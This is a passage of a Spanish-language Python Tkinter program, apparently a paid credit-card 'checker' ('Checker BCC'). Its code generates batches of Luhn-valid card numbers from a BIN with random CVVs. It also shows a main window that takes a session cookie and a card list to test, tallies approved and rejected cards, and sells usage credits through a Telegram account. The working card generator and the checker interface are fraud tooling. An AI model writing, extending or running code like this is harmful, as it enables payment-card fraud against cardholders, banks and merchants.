                                 pady=5)
    btn_cambiar_foto.pack(pady=10)
    
    # Información del usuario
    frame_info = tk.Frame(frame_principal, bg=COLOR_FONDO)
    frame_info.pack(fill='x', pady=10)
    
    # Nombre de usuario
    tk.Label(frame_info, 
            text=f"Usuario: {usuario_actual}", 
            font=custom_font_bold, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w', pady=5)
    
    # Email
    tk.Label(frame_info, 
            text=f"Email: {usuarios[usuario_actual]['email']}", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w', pady=5)
    
    # Créditos
    tk.Label(frame_info, 
            text=f"Créditos disponibles: {usuarios[usuario_actual]['creditos']}", 
            font=custom_font, 
            fg=COLOR_PRIMARIO, 
            bg=COLOR_FONDO).pack(anchor='w', pady=5)
    
    # Estadísticas
    tk.Label(frame_info, 
            text="Estadísticas:", 
            font=custom_font_bold, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w', pady=(15, 5))
    
    # Tarjetas aprobadas
    tk.Label(frame_info, 
            text=f"Total tarjetas aprobadas: {total_tarjetas_aprobadas}", 
            font=custom_font, 
            fg=COLOR_APROBADA, 
            bg=COLOR_FONDO).pack(anchor='w', pady=2)
    
    # Tarjetas rechazadas
    tk.Label(frame_info, 
            text=f"Total tarjetas rechazadas: {total_tarjetas_rechazadas}", 
            font=custom_font, 
            fg=COLOR_RECHAZADA, 
            bg=COLOR_FONDO).pack(anchor='w', pady=2)
    
    # Porcentaje de éxito
    total = total_tarjetas_aprobadas + total_tarjetas_rechazadas
    porcentaje = (total_tarjetas_aprobadas / total * 100) if total > 0 else 0
    tk.Label(frame_info, 
            text=f"Porcentaje de éxito: {porcentaje:.2f}%", 
            font=custom_font, 
            fg=COLOR_SECUNDARIO, 
            bg=COLOR_FONDO).pack(anchor='w', pady=2)
    
    # Historial de actividad
    tk.Label(frame_info, 
            text="Historial de actividad:", 
            font=custom_font_bold, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w', pady=(15, 5))
    
    # Fecha de registro
    user_data = firebase_get_user_data(user_id_actual, user_token)
    if user_data:
        fecha_registro = user_data.get('fecha_registro', 'Desconocida')
        ultima_conexion = user_data.get('ultima_conexion', 'Desconocida')
        
        tk.Label(frame_info, 
                text=f"Fecha de registro: {fecha_registro}", 
                font=custom_font, 
                fg=COLOR_TEXTO, 
                bg=COLOR_FONDO).pack(anchor='w', pady=2)
        
        tk.Label(frame_info, 
                text=f"Última conexión: {ultima_conexion}", 
                font=custom_font, 
                fg=COLOR_TEXTO, 
                bg=COLOR_FONDO).pack(anchor='w', pady=2)

def cambiar_foto_perfil(ventana_perfil):
    """Permite al usuario seleccionar y subir una nueva foto de perfil"""
    file_path = filedialog.askopenfilename(
        title="Seleccionar imagen de perfil",
        filetypes=[("Imágenes", "*.jpg *.jpeg *.png"), ("Todos los archivos", "*.*")]
    )
    
    if file_path:
        try:
            # Subir la imagen a Firebase Storage
            foto_url = firebase_upload_profile_picture(user_id_actual, user_token, file_path)
            
            if foto_url:
                # Actualizar la URL en la base de datos
                if firebase_update_user_data(user_id_actual, user_token, {"foto_perfil": foto_url}):
                    usuarios[usuario_actual]['foto_perfil'] = foto_url
                    messagebox.showinfo("Éxito", "Foto de perfil actualizada correctamente")
                    
                    # Cerrar y volver a abrir la ventana de perfil para mostrar la nueva imagen
                    ventana_perfil.destroy()
                    abrir_perfil()
                else:
                    messagebox.showerror("Error", "No se pudo actualizar la foto de perfil")
            else:
                messagebox.showerror("Error", "No se pudo subir la imagen")
        except Exception as e:
            messagebox.showerror("Error", f"Error al cambiar la foto de perfil: {str(e)}")

# ============= GENERADOR DE TARJETAS MEJORADO =============
def abrir_generador_tarjetas():
    generador = tk.Toplevel(root)
    generador.title("Generador de Tarjetas")
    generador.geometry("600x700")
    generador.resizable(False, False)
    generador.configure(bg=COLOR_FONDO)
    generador.transient(root)
    generador.grab_set()
    
    # Título
    tk.Label(generador, 
            text="Generador de Tarjetas", 
            font=("Segoe UI", 14, "bold"), 
            fg=COLOR_PRIMARIO, 
            bg=COLOR_FONDO).pack(pady=10)
    
    # Frame principal con scroll
    canvas = tk.Canvas(generador, bg=COLOR_FONDO, highlightthickness=0)
    scrollbar = ttk.Scrollbar(generador, orient="vertical", command=canvas.yview)
    scrollable_frame = tk.Frame(canvas, bg=COLOR_FONDO)
    
    scrollable_frame.bind(
        "<Configure>",
        lambda e: canvas.configure(
            scrollregion=canvas.bbox("all")
        )
    )
    
    canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
    canvas.configure(yscrollcommand=scrollbar.set)
    
    canvas.pack(side="left", fill="both", expand=True)
    scrollbar.pack(side="right", fill="y")
    
    # Frame de entrada de datos
    frame_entrada = tk.Frame(scrollable_frame, bg=COLOR_FONDO)
    frame_entrada.pack(fill='x', pady=5, padx=20)
    
    # BIN (6+ dígitos)
    tk.Label(frame_entrada, 
            text="BIN (6+ dígitos):", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).grid(row=0, column=0, sticky='w', padx=(0, 5))
    entry_bin = tk.Entry(frame_entrada, 
                        width=16, 
                        font=custom_font,
                        bg=COLOR_ENTRY, 
                        fg=COLOR_TEXTO,
                        insertbackground=COLOR_TEXTO)
    entry_bin.grid(row=0, column=1, sticky='ew', padx=(0, 10))
    
    # Botón para verificar BIN
    btn_verificar_bin = HoverButton(frame_entrada, 
                                  text="Verificar BIN", 
                                  command=lambda: mostrar_info_bin(entry_bin.get()),
                                  bg=COLOR_BOTON, 
                                  fg=COLOR_TEXTO,
                                  activebackground=COLOR_BOTON_HOVER,
                                  activeforeground=COLOR_TEXTO,
                                  relief='flat',
                                  font=custom_font,
                                  padx=5,
                                  pady=2)
    btn_verificar_bin.grid(row=0, column=2, padx=(5, 0))
    
    # Frame para BINs recientes
    frame_bins_recientes = tk.Frame(frame_entrada, bg=COLOR_FONDO)
    frame_bins_recientes.grid(row=1, column=0, columnspan=3, sticky='ew', pady=(5, 0))
    
    tk.Label(frame_bins_recientes, 
            text="BINs recientes:", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w')
    
    # Crear botones para los últimos BINs usados
    for i, bin_num in enumerate(bins_history[-5:]):  # Mostrar solo los últimos 5
        btn_bin = HoverButton(frame_bins_recientes, 
                            text=bin_num, 
                            command=lambda b=bin_num: [entry_bin.delete(0, 'end'), entry_bin.insert(0, b)],
                            bg=COLOR_BOTON_OSCURO, 
                            fg=COLOR_TEXTO,
                            activebackground="#333333",
                            activeforeground=COLOR_TEXTO,
                            relief='flat',
                            font=custom_font,
                            padx=5,
                            pady=2)
        btn_bin.pack(side='left', padx=2)
    
    # Mes de expiración
    tk.Label(frame_entrada, 
            text="Mes (MM):", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).grid(row=2, column=0, sticky='w', padx=(0, 5), pady=(10, 0))
    entry_mes = tk.Entry(frame_entrada, 
                        width=3, 
                        font=custom_font,
                        bg=COLOR_ENTRY, 
                        fg=COLOR_TEXTO,
                        insertbackground=COLOR_TEXTO)
    entry_mes.grid(row=2, column=1, sticky='w', padx=(0, 10), pady=(10, 0))
    entry_mes.insert(0, datetime.now().strftime('%m'))
    
    # Año de expiración
    tk.Label(frame_entrada, 
            text="Año (YYYY):", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w', padx=(0, 5), pady=(10, 0))
    entry_ano = tk.Entry(frame_entrada, 
                        width=5, 
                        font=custom_font,
                        bg=COLOR_ENTRY, 
                        fg=COLOR_TEXTO,
                        insertbackground=COLOR_TEXTO)
    entry_ano.grid(row=3, column=1, sticky='w', padx=(0, 10), pady=(10, 0))
    entry_ano.insert(0, str(datetime.now().year + 3))
    
    # CVV
    tk.Label(frame_entrada, 
            text="CVV (3 dígitos, dejar vacío para aleatorio):", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).grid(row=4, column=0, sticky='w', padx=(0, 5), pady=(10, 0))
    entry_cvv = tk.Entry(frame_entrada, 
                        width=4, 
                        font=custom_font,
                        bg=COLOR_ENTRY, 
                        fg=COLOR_TEXTO,
                        insertbackground=COLOR_TEXTO)
    entry_cvv.grid(row=4, column=1, sticky='w', padx=(0, 10), pady=(10, 0))
    
    # Cantidad a generar
    tk.Label(frame_entrada, 
            text="Cantidad (1-1000):", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).grid(row=5, column=0, sticky='w', padx=(0, 5), pady=(10, 0))
    entry_cantidad = tk.Entry(frame_entrada, 
                             width=5, 
                             font=custom_font,
                             bg=COLOR_ENTRY, 
                             fg=COLOR_TEXTO,
                             insertbackground=COLOR_TEXTO)
    entry_cantidad.grid(row=5, column=1, sticky='w', padx=(0, 10), pady=(10, 0))
    entry_cantidad.insert(0, "1")
    
    # Frame para botones
    frame_botones = tk.Frame(scrollable_frame, bg=COLOR_FONDO)
    frame_botones.pack(fill='x', pady=10, padx=20)
    
    # Área de información del BIN
    frame_info_bin = tk.Frame(scrollable_frame, bg=COLOR_ENTRY, padx=10, pady=10)
    frame_info_bin.pack(fill='x', padx=20, pady=10)
    
    lbl_info_bin = tk.Label(frame_info_bin, 
                          text="Ingrese un BIN y haga clic en 'Verificar BIN' para obtener información", 
                          font=custom_font, 
                          fg=COLOR_TEXTO, 
                          bg=COLOR_ENTRY,
                          wraplength=500,
                          justify='left')
    lbl_info_bin.pack(anchor='w')
    
    def mostrar_info_bin(bin_num):
        """Muestra información sobre el BIN ingresado"""
        if len(bin_num) < 6:
            lbl_info_bin.config(text="El BIN debe tener al menos 6 dígitos", fg=COLOR_RECHAZADA)
            return
        
        info = obtener_info_bin(bin_num)
        if 'error' in info:
            lbl_info_bin.config(text=info['error'], fg=COLOR_RECHAZADA)
        else:
            texto_info = (
                f"Tipo de tarjeta: {info['tipo']}\n"
                f"Banco: {info['banco']}\n"
                f"País: {info['pais']}\n"
                f"Nivel: {info['nivel']}\n"
                f"Prepagada: {info['prepagada']}"
            )
            lbl_info_bin.config(text=texto_info, fg=COLOR_APROBADA)
    
    def generar_tarjetas():
        bin_number = entry_bin.get().strip()
        mes = entry_mes.get().strip()
        ano = entry_ano.get().strip()
        cvv = entry_cvv.get().strip()
        cantidad = entry_cantidad.get().strip()
        
        if not bin_number.isdigit() or len(bin_number) < 6:
            messagebox.showerror("Error", "Ingrese al menos 6 dígitos para el BIN")
            return
        
        if not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
            messagebox.showerror("Error", "Mes inválido (1-12)")
            return
            
        if not ano.isdigit() or len(ano) != 4:
            messagebox.showerror("Error", "Año inválido (4 dígitos)")
            return
            
        usar_cvv_aleatorio = not (cvv.isdigit() and len(cvv) == 3)
            
        try:
            cantidad = int(cantidad)
            if cantidad < 1 or cantidad > 1000:
                messagebox.showerror("Error", "Cantidad debe ser entre 1 y 1000")
                return
        except:
            messagebox.showerror("Error", "Cantidad inválida")
            return
        
        # Calcular dígito de verificación (Luhn)
        def luhn_checksum(card_number):
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = 0
            checksum += sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d*2))
            return checksum % 10
        
        def calculate_luhn(partial_card_number):
            check_digit = luhn_checksum(int(partial_card_number) * 10)
            return check_digit if check_digit == 0 else (10 - check_digit)
        
        # Generar tarjetas
        tarjetas_generadas = []
        for _ in range(cantidad):
            longitud_aleatoria = 16 - len(bin_number)
            if longitud_aleatoria > 0:
                aleatorio = ''.join([str(random.randint(0, 9)) for _ in range(longitud_aleatoria - 1)])
                partial = bin_number + aleatorio
            else:
                partial = bin_number[:15]
            
            check_digit = calculate_luhn(partial)
            tarjeta = partial + str(check_digit)
            
            cvv_final = cvv if not usar_cvv_aleatorio else f"{random.randint(0,999):03d}"
            tarjeta_completa = f"{tarjeta}|{mes}|{ano}|{cvv_final}"
            tarjetas_generadas.append(tarjeta_completa)
        
        # Agregar el BIN al historial
        agregar_bin_al_historial(bin_number)
        
        # Mostrar resultados
        texto_resultado.delete('1.0', 'end')
        texto_resultado.insert('end', '\n'.join(tarjetas_generadas))
        messagebox.showinfo("Éxito", f"Se generaron {cantidad} tarjetas")
    
    def copiar_tarjetas():
        contenido = texto_resultado.get('1.0', 'end-1c')
        if contenido:
            generador.clipboard_clear()
            generador.clipboard_append(contenido)
            messagebox.showinfo("Copiado", "Tarjetas copiadas al portapapeles")
        else:
            messagebox.showerror("Error", "No hay tarjetas para copiar")
    
    def enviar_a_lista():
        contenido = texto_resultado.get('1.0', 'end-1c')
        if contenido:
            entry_lista_cartoes.insert('end', f"{contenido}\n")
            messagebox.showinfo("Éxito", "Tarjetas añadidas a la lista")
            generador.destroy()
        else:
            messagebox.showerror("Error", "No hay tarjetas para enviar")
    
    def limpiar_generador():
        entry_bin.delete(0, 'end')
        entry_mes.delete(0, 'end')
        entry_mes.insert(0, datetime.now().strftime('%m'))
        entry_ano.delete(0, 'end')
        entry_ano.insert(0, str(datetime.now().year + 3))
        entry_cvv.delete(0, 'end')
        entry_cantidad.delete(0, 'end')
        entry_cantidad.insert(0, "1")
        texto_resultado.delete('1.0', 'end')
        lbl_info_bin.config(text="Ingrese un BIN y haga clic en 'Verificar BIN' para obtener información", 
                          fg=COLOR_TEXTO)
    
    # Botones
    btn_generar = HoverButton(frame_botones, 
                            text="Generar", 
                            command=generar_tarjetas,
                            bg=COLOR_BOTON, 
                            fg=COLOR_TEXTO,
                            activebackground=COLOR_BOTON_HOVER,
                            activeforeground=COLOR_TEXTO,
                            relief='flat',
                            font=custom_font_bold,
                            padx=15,
                            pady=5)
    btn_generar.pack(side='left', padx=5, fill='x', expand=True)
    
    btn_copiar = HoverButton(frame_botones, 
                            text="Copiar", 
                            command=copiar_tarjetas,
                            bg=COLOR_BOTON, 
                            fg=COLOR_TEXTO,
                            activebackground=COLOR_BOTON_HOVER,
                            activeforeground=COLOR_TEXTO,
                            relief='flat',
                            font=custom_font_bold,
                            padx=15,
                            pady=5)
    btn_copiar.pack(side='left', padx=5, fill='x', expand=True)
    
    btn_enviar = HoverButton(frame_botones, 
                           text="Enviar a Lista", 
                           command=enviar_a_lista,
                           bg=COLOR_SECUNDARIO, 
                           fg=COLOR_FONDO,
                           activebackground="#9C64FF",
                           activeforeground=COLOR_FONDO,
                           relief='flat',
                           font=custom_font_bold,
                           padx=15,
                           pady=5)
    btn_enviar.pack(side='left', padx=5, fill='x', expand=True)
    
    btn_limpiar_gen = HoverButton(frame_botones, 
                                text="Limpiar", 
                                command=limpiar_generador,
                                bg=COLOR_BOTON_OSCURO, 
                                fg=COLOR_TEXTO,
                                activebackground="#333333",
                                activeforeground=COLOR_TEXTO,
                                relief='flat',
                                font=custom_font_bold,
                                padx=15,
                                pady=5)
    btn_limpiar_gen.pack(side='left', padx=5, fill='x', expand=True)
    
    # Área de resultados
    tk.Label(scrollable_frame, 
            text="Resultados:", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w', pady=(5, 0), padx=20)
    
    scroll_resultado = tk.Scrollbar(scrollable_frame)
    scroll_resultado.pack(side='right', fill='y', padx=(0, 20))
    
    texto_resultado = tk.Text(scrollable_frame, 
                            yscrollcommand=scroll_resultado.set,
                            height=8,
                            bg=COLOR_ENTRY, 
                            fg=COLOR_TEXTO,
                            insertbackground=COLOR_TEXTO,
                            relief='flat')
    texto_resultado.pack(fill='both', expand=True, padx=20)
    scroll_resultado.config(command=texto_resultado.yview)

# ============= INTERFAZ PRINCIPAL =============
root = tk.Tk()
root.title("Checker BCC - Sistema de Créditos")
root.geometry("600x750")
root.minsize(600, 750)
root.maxsize(600, 750)
root.resizable(False, False)
root.configure(bg=COLOR_FONDO)

# Configurar fuente personalizada
try:
    custom_font = tkfont.Font(family="Segoe UI", size=10)
    custom_font_bold = tkfont.Font(family="Segoe UI", size=10, weight="bold")
except:
    custom_font = tkfont.Font(size=10)
    custom_font_bold = tkfont.Font(size=10, weight="bold")

# Configurar evento para procesar mensajes
root.bind('<<MessageQueued>>', procesar_mensajes)

# Frame de login
frame_login = tk.Frame(root, bg=COLOR_FONDO, padx=20, pady=20)

# Título login
tk.Label(frame_login, 
        text="Iniciar Sesión", 
        font=("Segoe UI", 14, "bold"), 
        fg=COLOR_PRIMARIO, 
        bg=COLOR_FONDO).pack(pady=20)

# Campos de login
tk.Label(frame_login, 
        text="Email:", 
        font=custom_font, 
        fg=COLOR_TEXTO, 
        bg=COLOR_FONDO).pack(anchor='w')
entry_email = tk.Entry(frame_login, 
                     width=25, 
                     font=custom_font,
                     bg=COLOR_ENTRY, 
                     fg=COLOR_TEXTO,
                     insertbackground=COLOR_TEXTO)
entry_email.pack(fill='x', pady=5)

tk.Label(frame_login, 
        text="Contraseña:", 
        font=custom_font, 
        fg=COLOR_TEXTO, 
        bg=COLOR_FONDO).pack(anchor='w')
entry_password = tk.Entry(frame_login, 
                        width=25, 
                        font=custom_font,
                        bg=COLOR_ENTRY, 
                        fg=COLOR_TEXTO,
                        insertbackground=COLOR_TEXTO,
                        show="*")
entry_password.pack(fill='x', pady=5)

# Mensaje de error login
mensaje_error = tk.Label(frame_login, 
                       text="", 
                       font=custom_font,
                       fg=COLOR_RECHAZADA, 
                       bg=COLOR_FONDO)
mensaje_error.pack(pady=5)

# Botón de login
btn_login = HoverButton(frame_login, 
                      text="Iniciar Sesión", 
                      command=iniciar_sesion,
                      bg=COLOR_SECUNDARIO, 
                      fg=COLOR_FONDO,
                      activebackground="#9C64FF",
                      activeforeground=COLOR_FONDO,
                      relief='flat',
                      font=custom_font_bold,
                      padx=15,
                      pady=5)
btn_login.pack(pady=15)

# Botón de reintentar
btn_reintentar = HoverButton(frame_login, 
                           text="Reintentar", 
                           command=lambda: None,
                           bg=COLOR_BOTON_OSCURO, 
                           fg=COLOR_TEXTO,
                           activebackground="#333333",
                           activeforeground=COLOR_TEXTO,
                           relief='flat',
                           font=custom_font_bold,
                           padx=15,
                           pady=5)
btn_reintentar.pack_forget()

# Botón para ir a registro
btn_ir_registro = HoverButton(frame_login, 
                            text="Registrar Nuevo Usuario", 
                            command=mostrar_registro,
                            bg=COLOR_BOTON_OSCURO, 
                            fg=COLOR_TEXTO,
                            activebackground="#333333",
                            activeforeground=COLOR_TEXTO,
                            relief='flat',
                            font=custom_font,
                            padx=15,
                            pady=5)
btn_ir_registro.pack()

# Botón para comprar créditos (Telegram)
btn_comprar_creditos = HoverButton(frame_login, 
                                 text="Comprar Créditos (Telegram @bcccheckers)", 
                                 command=abrir_telegram,
                                 bg=COLOR_BOTON, 
                                 fg=COLOR_TEXTO,
                                 activebackground=COLOR_BOTON_HOVER,
                                 activeforeground=COLOR_TEXTO,
                                 relief='flat',
                                 font=custom_font,
                                 padx=15,
                                 pady=5)
btn_comprar_creditos.pack(pady=(10, 0))

# Frame de registro
frame_registro = tk.Frame(root, bg=COLOR_FONDO, padx=20, pady=20)

# Título registro
tk.Label(frame_registro, 
        text="Registrar Usuario", 
        font=("Segoe UI", 14, "bold"), 
        fg=COLOR_PRIMARIO, 
        bg=COLOR_FONDO).pack(pady=20)

# Campos de registro
tk.Label(frame_registro, 
        text="Email:", 
        font=custom_font, 
        fg=COLOR_TEXTO, 
        bg=COLOR_FONDO).pack(anchor='w')
entry_email_reg = tk.Entry(frame_registro, 
                         width=25, 
                         font=custom_font,
                         bg=COLOR_ENTRY, 
                         fg=COLOR_TEXTO,
                         insertbackground=COLOR_TEXTO)
entry_email_reg.pack(fill='x', pady=5)

tk.Label(frame_registro, 
        text="Nombre de Usuario:", 
        font=custom_font, 
        fg=COLOR_TEXTO, 
        bg=COLOR_FONDO).pack(anchor='w')
entry_usuario_reg = tk.Entry(frame_registro, 
                           width=25, 
                           font=custom_font,
                           bg=COLOR_ENTRY, 
                           fg=COLOR_TEXTO,
                           insertbackground=COLOR_TEXTO)
entry_usuario_reg.pack(fill='x', pady=5)

tk.Label(frame_registro, 
        text="Contraseña:", 
        font=custom_font, 
        fg=COLOR_TEXTO, 
        bg=COLOR_FONDO).pack(anchor='w')
entry_password_reg = tk.Entry(frame_registro, 
                            width=25, 
                            font=custom_font,
                            bg=COLOR_ENTRY, 
                            fg=COLOR_TEXTO,
                            insertbackground=COLOR_TEXTO,
                            show="*")
entry_password_reg.pack(fill='x', pady=5)

tk.Label(frame_registro, 
        text="Confirmar Contraseña:", 
        font=custom_font, 
        fg=COLOR_TEXTO, 
        bg=COLOR_FONDO).pack(anchor='w')
entry_confirmar_reg = tk.Entry(frame_registro, 
                             width=25, 
                             font=custom_font,
                             bg=COLOR_ENTRY, 
                             fg=COLOR_TEXTO,
                             insertbackground=COLOR_TEXTO,
                             show="*")
entry_confirmar_reg.pack(fill='x', pady=5)

tk.Label(frame_registro, 
        text="Código de Invitación (opcional):", 
        font=custom_font, 
        fg=COLOR_TEXTO, 
        bg=COLOR_FONDO).pack(anchor='w')
entry_codigo_reg = tk.Entry(frame_registro, 
                          width=25, 
                          font=custom_font,
                          bg=COLOR_ENTRY, 
                          fg=COLOR_TEXTO,
                          insertbackground=COLOR_TEXTO)
entry_codigo_reg.pack(fill='x', pady=5)

# Mensaje de error registro
mensaje_error_reg = tk.Label(frame_registro, 
                           text="", 
                           font=custom_font,
                           fg=COLOR_RECHAZADA, 
                           bg=COLOR_FONDO)
mensaje_error_reg.pack(pady=5)

# Botón de registro
btn_registrar = HoverButton(frame_registro, 
                          text="Registrar", 
                          command=registrar_usuario,
                          bg=COLOR_SECUNDARIO, 
                          fg=COLOR_FONDO,
                          activebackground="#9C64FF",
                          activeforeground=COLOR_FONDO,
                          relief='flat',
                          font=custom_font_bold,
                          padx=15,
                          pady=5)
btn_registrar.pack(pady=15)

# Botón para volver a login
btn_volver_login = HoverButton(frame_registro, 
                             text="Volver a Login", 
                             command=ocultar_registro,
                             bg=COLOR_BOTON_OSCURO, 
                             fg=COLOR_TEXTO,
                             activebackground="#333333",
                             activeforeground=COLOR_TEXTO,
                             relief='flat',
                             font=custom_font,
                             padx=15,
                             pady=5)
btn_volver_login.pack()

# Botón para comprar créditos (Telegram) en registro
btn_comprar_creditos_reg = HoverButton(frame_registro, 
                                     text="Comprar Créditos (Telegram @bcccheckers)", 
                                     command=abrir_telegram,
                                     bg=COLOR_BOTON, 
                                     fg=COLOR_TEXTO,
                                     activebackground=COLOR_BOTON_HOVER,
                                     activeforeground=COLOR_TEXTO,
                                     relief='flat',
                                     font=custom_font,
                                     padx=15,
                                     pady=5)
btn_comprar_creditos_reg.pack(pady=(10, 0))

# Frame principal de la aplicación
frame_principal = tk.Frame(root, bg=COLOR_FONDO, padx=20, pady=20)

# Barra superior con información de usuario y botón de perfil
frame_superior = tk.Frame(frame_principal, bg=COLOR_FONDO)
frame_superior.pack(fill='x', pady=(0, 10))

# Título
titulo = tk.Label(frame_superior, 
                 text="CHECKER BCC", 
                 font=("Segoe UI", 18, "bold"), 
                 fg=COLOR_PRIMARIO, 
                 bg=COLOR_FONDO)
titulo.pack(side='left')

# Botón de perfil
btn_perfil = HoverButton(frame_superior, 
                       text="👤", 
                       command=abrir_perfil,
                       bg=COLOR_PERFIL, 
                       fg=COLOR_FONDO,
                       activebackground="#66BB6A",
                       activeforeground=COLOR_FONDO,
                       relief='flat',
                       font=("Segoe UI", 12),
                       padx=10,
                       pady=2,
                       bd=0)
btn_perfil.pack(side='right')

# Información de usuario
frame_usuario = tk.Frame(frame_principal, bg=COLOR_FONDO)
frame_usuario.pack(fill='x', pady=(0, 10))

etiqueta_usuario = tk.Label(frame_usuario, 
                          text="No autenticado", 
                          font=custom_font,
                          fg=COLOR_TEXTO, 
                          bg=COLOR_FONDO)
etiqueta_usuario.pack(side='left')

etiqueta_creditos = tk.Label(frame_usuario, 
                           text="Créditos: 0", 
                           font=custom_font_bold,
                           fg=COLOR_TEXTO, 
                           bg=COLOR_FONDO)
etiqueta_creditos.pack(side='right')

# Contadores de tarjetas
frame_contadores = tk.Frame(frame_principal, bg=COLOR_FONDO)
frame_contadores.pack(fill='x', pady=(0, 10))

contador_tarjetas = tk.Label(frame_contadores, 
                           text="Tarjetas en lista: 0", 
                           font=custom_font,
                           fg=COLOR_TEXTO, 
                           bg=COLOR_FONDO)
contador_tarjetas.pack(side='left', padx=5)

contador_aprobadas = tk.Label(frame_contadores, 
                            text="Aprobadas: 0 (Total: 0)", 
                            font=custom_font,
                            fg=COLOR_APROBADA, 
                            bg=COLOR_FONDO)
contador_aprobadas.pack(side='left', padx=5)

contador_rechazadas = tk.Label(frame_contadores, 
                             text="Rechazadas: 0 (Total: 0)", 
                             font=custom_font,
                             fg=COLOR_RECHAZADA, 
                             bg=COLOR_FONDO)
contador_rechazadas.pack(side='left', padx=5)

# Frame de entrada de datos
frame_entrada = tk.Frame(frame_principal, bg=COLOR_FONDO)
frame_entrada.pack(fill='x', pady=10)

# Campo para la cookie
tk.Label(frame_entrada, 
        text="Cookie:", 
        font=custom_font_bold, 
        fg=COLOR_TEXTO, 
        bg=COLOR_FONDO).pack(anchor='w')
entry_cookie = tk.Entry(frame_entrada, 
                       width=50, 
                       font=custom_font,
                       bg=COLOR_ENTRY, 
                       fg=COLOR_TEXTO,
                       insertbackground=COLOR_TEXTO,
                       relief='flat',
                       highlightthickness=1,
                       highlightcolor=COLOR_SECUNDARIO,
                       highlightbackground=COLOR_SECUNDARIO)
entry_cookie.pack(fill='x', pady=5)

# Campo para las tarjetas
tk.Label(frame_entrada, 
        text="Lista de Tarjetas:", 
        font=custom_font_bold, 
        fg=COLOR_TEXTO, 
        bg=COLOR_FONDO).pack(anchor='w')
entry_lista_cartoes = tk.Text(frame_entrada, 
                             height=8,
                             font=custom_font,
                             bg=COLOR_ENTRY, 
                             fg=COLOR_TEXTO,
                             insertbackground=COLOR_TEXTO,
                             relief='flat',
                             highlightthickness=1,
                             highlightcolor=COLOR_SECUNDARIO,
                             highlightbackground=COLOR_SECUNDARIO)
entry_lista_cartoes.pack(fill='x', pady=5)

# Frame para botones principales
frame_botones_principales = tk.Frame(frame_principal, bg=COLOR_FONDO)
frame_botones_principales.pack(pady=10)

btn_enviar = HoverButton(frame_botones_principales, 
                        text="CARGAR CC'S", 
                        command=enviar_datos,
                        bg=COLOR_BOTON, 
                        fg=COLOR_TEXTO,
                        activebackground=COLOR_BOTON_HOVER,
                        activeforeground=COLOR_TEXTO,
                        relief='flat',
                        font=custom_font_bold,
                        padx=20,
                        pady=8,
                        bd=0)
btn_enviar.pack(side='left', padx=5)

btn_iniciar = HoverButton(frame_botones_principales, 
                         text="INICIAR CHECKER", 
                         command=iniciar_verificacion,
                         bg=COLOR_SECUNDARIO, 
                         fg=COLOR_FONDO,
                         activebackground="#9C64FF",
                         activeforeground=COLOR_FONDO,
                         relief='flat',
                         font=custom_font_bold,
                         padx=20,
                         pady=8,
                         bd=0)
btn_iniciar.pack(side='left', padx=5)

btn_generador = HoverButton(frame_botones_principales, 
                          text="Generar Tarjetas", 
                          command=abrir_generador_tarjetas,
                          bg=COLOR_BOTON_OSCURO, 
                          fg=COLOR_TEXTO,
                          activebackground="#333333",
                          activeforeground=COLOR_TEXTO,
                          relief='flat',
                          font=custom_font_bold,
                          padx=20,
                          pady=8,
                          bd=0)
btn_generador.pack(side='left', padx=5)

btn_pausar = HoverButton(frame_botones_principales, 
                        text="Pausar", 
                        command=pausar_verificacion,
                        bg=COLOR_BOTON_OSCURO, 
                        fg=COLOR_TEXTO,
                        activebackground="#333333",
                        activeforeground=COLOR_TEXTO,
                        relief='flat',
                        font=custom_font_bold,
                        padx=20,
                        pady=8,
                        bd=0,
                        state="disabled")
btn_pausar.pack(side='left', padx=5)

# Frame para botones secundarios
frame_botones_secundarios = tk.Frame(frame_principal, bg=COLOR_FONDO)
frame_botones_secundarios.pack(pady=(0, 10))

btn_limpiar = HoverButton(frame_botones_secundarios, 
                         text="Limpiar Lista", 
                         command=limpiar_lista,
                         bg=COLOR_BOTON_OSCURO, 
                         fg=COLOR_TEXTO,
                         activebackground="#333333",
                         activeforeground=COLOR_TEXTO,
                         relief='flat',
                         font=custom_font_bold,
                         padx=20,
                         pady=8,
                         bd=0)
btn_limpiar.pack(side='left', padx=5)

# Botón de créditos (solo visible para admins)
btn_creditos = HoverButton(frame_botones_secundarios, 
                         text="Administrar Créditos", 
                         command=abrir_panel_creditos,
                         bg=COLOR_SECUNDARIO, 
                         fg=COLOR_FONDO,
                         activebackground="#9C64FF",
                         activeforeground=COLOR_FONDO,
                         relief='flat',
                         font=custom_font_bold,
                         padx=20,
                         pady=8,
                         bd=0)
btn_creditos.pack_forget()

# Botón de admin (solo visible para admins)
btn_admin = HoverButton(frame_botones_secundarios, 
                      text="Panel Admin", 
                      command=lambda: abrir_panel_admin(),
                      bg=COLOR_ADMIN, 
                      fg=COLOR_FONDO,
                      activebackground="#FFC04D",
                      activeforeground=COLOR_FONDO,
                      relief='flat',
                      font=custom_font_bold,
                      padx=20,
                      pady=8,
                      bd=0)
btn_admin.pack_forget()

# Botón para cerrar sesión
btn_cerrar_sesion = HoverButton(frame_botones_secundarios, 
                              text="Cerrar Sesión", 
                              command=cerrar_sesion,
                              bg=COLOR_RECHAZADA, 
                              fg=COLOR_FONDO,
                              activebackground="#FF7777",
                              activeforeground=COLOR_FONDO,
                              relief='flat',
                              font=custom_font_bold,
                              padx=20,
                              pady=8,
                              bd=0)
btn_cerrar_sesion.pack(side='left', padx=5)

# Área de mensajes
